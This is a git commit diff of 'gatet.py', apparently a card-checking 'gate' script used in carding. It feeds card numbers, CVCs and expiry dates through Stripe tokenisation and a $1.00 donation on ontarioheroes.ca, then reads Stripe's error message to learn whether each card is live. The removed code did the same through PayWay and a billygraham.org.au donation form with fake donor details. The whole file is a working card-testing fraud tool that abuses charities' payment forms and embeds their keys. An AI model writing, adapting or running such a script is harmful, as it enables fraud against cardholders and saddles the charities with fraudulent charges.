c46ce3077fcd4bd297bf6fb1d88c24418af602d3
Rodamuser08 <rodamuser08@gmail.com>
2025-07-01 16:40:19 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -17,103 +17,65 @@ def Tele(ccx):
 	random_amount1 = random.randint(1, 9)
 	random_amount2 = random.randint(1, 99)
 	
-	url = "https://api.payway.com.au/rest/v1/single-use-tokens"
-	
-	payload = {
-	  'paymentMethod': "creditCard",
-	  'connectionType': "FRAME",
-	  'cardNumber': n,
-	  'cvn': cvc,
-	  'cardholderName': "Dao Khao Saard",
-	  'expiryDateMonth': mm,
-	  'expiryDateYear': yy,
-	  'threeDS2': "false"
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
+	
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fa84e0dccbf%3B+stripe-js-v3%2Fa84e0dccbf%3B+card-element&key=pk_live_51KyC7aCLoq7JcRThGLcWCXdUAI14qbuWIkoCuYCOLnvjKy257yEbRGkK3F99aAeu7yJJeQuxwCb2FGw3OFv8VVDU00W2Me8urc'
+	
+	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
 	
 	headers = {
-	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-	  'Accept': "application/json",
-	  'authority': "api.payway.com.au",
-	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-	  'authorization': "Basic UTEwNzM1X1BVQl9xdzdqc2dqdzlxZXM0dGdzN255N3RpencycGtxdWJzc2pmbmlyZjZpYzI1cjZrZXhmOWJkbTJxa2Z2YnY6",
-	  'origin': "https://api.payway.com.au",
-	  'referer': "https://api.payway.com.au/rest/v1/creditCard-iframe.htm",
-	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
-	  'sec-ch-ua-mobile': "?1",
-	  'sec-ch-ua-platform': "\"Android\"",
-	  'sec-fetch-dest': "empty",
-	  'sec-fetch-mode': "cors",
-	  'sec-fetch-site': "same-origin",
-	  'x-no-authenticate-basic': "true",
-	  'x-requested-with': "XMLHttpRequest"
+	    'authority': 'ontarioheroes.ca',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://ontarioheroes.ca',
+	    'referer': 'https://ontarioheroes.ca/be-a-supporter/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	response = session.post(url, data=payload, headers=headers)
-	
-	tok = response.json()['singleUseTokenId']
-	
-	url = "https://billygraham.org.au/donate/your-gift-to-rapid-response-team/"
-	
-	payload = {
-	  'input_3': 'Other amount|0',
-	  'input_4': f'$ {random_amount1}.{random_amount2}',
-	  'input_5': f'$ {random_amount1}.{random_amount2}',
-	  'input_1.3': 'Rodam',
-	  'input_1.6': 'User',
-	  'input_9.1': 'Street 27',
-	  'input_9.2': '',
-	  'input_9.3': 'New York',
-	  'input_9.4': 'New York',
-	  'input_9.5': '10080',
-	  'input_9.6': 'United States',
-	  'gpaa_place_9': '',
-	  'input_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
-	  'input_2_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
-	  'input_18': '',
-	  'input_13': '',
-	  'input_11.1': '',
-	  'input_11.2': tok,
-	  'input_12.1': '1',
-	  'input_12.2': 'I have read and agree to the <a target="_blank" href="https://billygraham.org.au/terms-conditions-privacy-policy/">website terms and conditions*</a>',
-	  'input_12.3': '4',
-	  'input_17': '',
-	  'input_22': '',
-	  'gform_submission_method': 'postback',
-	  'gform_theme': 'gravity-theme',
-	  'gform_style_settings': '{"inputPrimaryColor":"#204ce5"}',
-	  'is_submit_10': '1',
-	  'gform_submit': '10',
-	  'gform_unique_id': '',
-	  'state_10': 'WyJ7XCIzXCI6W1wiMmYxYThlMWZmM2ZlYjViZDMxZTBjNjc0YmU4NDVkMGJcIixcIjJhZTcyMmY3NjFkYjliZTY3MTAyOTZiMzk0ZDE3NDNlXCIsXCI4YjQ2ODU4ZDZmYTYwODQ4YTQ5OGUzOTQyN2U5YmY3MlwiLFwiZGU1ZGY2MmZhMjIzNGNhYzY2OWJjZjA2MjZmZmIzY2JcIl0sXCIxMi4xXCI6XCI1OWU3ZDY2MjA4M2EyYWVmMDk5ZTk2Y2JiZWViYTM5OVwiLFwiMTIuMlwiOlwiMzExMjE1MjBkZjhjNjI0NjBiMmZkNDUyZTQ3ZDlmZjNcIixcIjEyLjNcIjpcImRiMDAwODI5ZDJjMzQyZmEyYjM2YWIzN2NlM2JlMDM1XCJ9IiwiYjQ2YzQwYTk5NTVhNzZlOTI3NTM4MzFjZWQ5Y2NiMmMiXQ==',
-	  'gform_target_page_number_10': '0',
-	  'gform_source_page_number_10': '1',
-	  'gform_field_values': '',
-	  'version_hash': '427f05281b954394d96085c37c6d7882'
+	params = {
+	    't': '1751362075787',
 	}
 	
-	headers = {
-	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-	  'authority': "billygraham.org.au",
-	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-	  'cache-control': "max-age=0",
-	  'origin': "https://billygraham.org.au",
-	  'referer': "https://billygraham.org.au/donate/your-gift-to-rapid-response-team/",
-	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
-	  'sec-ch-ua-mobile': "?1",
-	  'sec-ch-ua-platform': "\"Android\"",
-	  'sec-fetch-dest': "document",
-	  'sec-fetch-mode': "navigate",
-	  'sec-fetch-site': "same-origin",
-	  'sec-fetch-user': "?1",
-	  'upgrade-insecure-requests': "1"
+	data = {
+	    'data': f'item_51__fluent_sf=&__fluent_form_embded_post_id=125693&_fluentform_51_fluentformnonce=3aa4d6bcd8&_wp_http_referer=%2Fbe-a-supporter%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&input_text_2=&email=&input_text=&custom-payment-amount=1.00&payment_method=stripe&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': '51',
 	}
 	
-	response = session.post(url, data=payload, headers=headers)
+	response = session.post(
+	    'https://ontarioheroes.ca/wp-admin/admin-ajax.php',
+	    params=params,
+	    headers=headers,
+	    data=data,
+	)
 	
 	try:
-		result = re.search(r'#8211; (.*?)<\/a><\/li><\/ol><\/div>', response.text).group(1)
+		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
 	except:
-		result = re.search(r'<h4>(.*?)<\/h4>', response.text).group(1)
+		result = response.text
 		
 	return (result)
